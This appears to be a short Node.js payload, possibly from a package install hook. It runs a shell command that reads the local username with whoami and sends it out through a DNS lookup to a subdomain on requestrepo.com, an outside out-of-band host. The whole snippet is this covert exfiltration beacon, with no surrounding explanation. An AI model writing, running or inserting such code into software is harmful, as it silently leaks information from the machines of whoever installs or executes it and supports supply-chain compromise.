const {exec} = require("child_process");
exec("user=$(whoami) && host $user.test.requestrepo.com", () => {});
